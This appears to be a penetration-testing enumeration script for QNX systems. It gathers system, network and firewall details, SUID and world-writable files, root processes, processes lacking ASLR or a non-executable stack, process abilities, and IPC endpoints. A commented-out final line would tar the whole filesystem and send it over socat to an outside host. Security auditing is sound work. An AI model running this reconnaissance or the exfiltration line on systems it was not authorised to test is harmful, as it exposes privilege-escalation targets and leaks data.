#!/bin/sh
PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/mnt/share/pentest:/persistent/pentest:/share/pentest:/tmp:.
export PATH
S=$(type sort)
U=$(type uniq)
test -z "$S" -o -z "$U" && { echo Error: sort and/or uniq not found ; exit 1; }
unset S
unset U

env > env.out
umask > umask.out
uname -a > uname.out
mount -f > mount.out
ifconfig -a > ifconfig.out
netstat -an > netstat.out
sockstat -nv > sockstat.out
route -n show > route.out
pfctl -s rules > firewall.out 2>&1
sysctl -a > sysctl.out
cat /proc/config > proc_config.out

find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -ld {} \; > suid.out 2> /dev/null
find / -perm -2 '!' -type l -exec ls -ld {} \; > write.out 2> /dev/null
#find / -perm -4 '!' -type l '!' -type d -exec ls -ld {} \; > read.out 2> /dev/null
find / > files.out 2> /dev/null
find / -exec ls -ld {} \; > files-all.out 2> /dev/null

pidin user > ps-uid.out
grep -w 0 ps-uid.out ps-root.out
  # Look for:
  # _NTO_PF_RING0        = 0x00008000
  # _NTO_PF_ASLR         = 0x01000000 NOT!
  # _NTO_PF_NOEXEC_STACK = 0x40000000 NOT!
pidin flags | \
 grep  -E ' [0-9a-f][0-9a-f][0-9a-f][0-9a-f][89a-f][0-9a-f][0-9a-f][0-9a-f]| [012389ab][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]| [0-9a-f][2468ace][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]' \
 > ps-$i.flags 2>/dev/null
pidin -f an_ > ps-sectype.out
pidin -f 'aenA' > ps-plain.out

## QNX7+ (has "O")
uname -r | grep -vE '^[4-6]' | grep -q . && pidin -f 'aenAhKoOq[E' > ps.out
## QNX65 with "o" reboot prob
uname -r | grep -vE '^[4-6]' | grep -q . && pidin -f 'aenAhKq[E' > ps.out
#for i in `grep " 0" ps-uid.out | sed 's/^ *//' | sed 's/ .*//'`; do pidin -p $i  -f 'abenAhKoOq[E'; done > ps-root.out
## or all processes on QNX65 with "o" probs
for i in `sed 's/^ *//' ps-plain.out | sed 's/ .*//' | sort -n | uniq`; do
  #qnx_channel_search $i 0 256 > ps-$i.channel 2> /dev/null
  pidin -p $i -f 'aeUVWXnA[' > ps-$i.channels 2> /dev/null
  pidin -p $i -f 'aenAhKq[Eo' > ps-$i.ps
  # R  Process has the ability when its effective user ID is 0.
  # N  Process has the ability when it has an effective user ID other than 0.
  # L  Ability is locked.
  # I  Ability is inherited by a spawn or exec.
  pidin -p $i -f 'aeUVWXnAk' | grep -E ' R| .N| ...I|^ *[1-9]' > ps-$i.abilities 2> /dev/null
done

{
find / -type s -ls 2>/dev/null
find / -type s -exec fuser -u {} \; 2>/dev/null
} > ipc-sockets.out

{
find / -type p -ls 2>/dev/null
find / -type p -exec fuser -u {} \; 2>/dev/null
} > ipc-fifo.out

{
test -d /dev/mqueue/ && find /dev/mqueue -type n -ls 2>/dev/null
test -d /dev/mqueue/ && find /dev/mqueue -type n -exec fuser -u {} \; 2>/dev/null
test -d /dev/mq && find /dev/mq/ -type n -ls 2>/dev/null
test -d /dev/mq && find /dev/mq/ -type n -exec fuser -u {} \; 2>/dev/null
} > ipc-mqueue.out

{
find /dev/shmem/ -type n -ls 2>/dev/null
ls -ld /dev/shmem/* 2>/dev/null
} > ipc-shmem.out

{
find /dev/name/ -type n -ls 2>/dev/null
} > ipc-channel-named.out

{
pidin -f 'aeUVWXnA[' | grep -Ev 'flags ....[13579bdf]' | grep -B1 flags | grep -v -- --
} > ipc-channel-process.out

#echo "TODO: toybox tar cf - / | socat - TCP-CONNECT:169.254.1.1:8888"
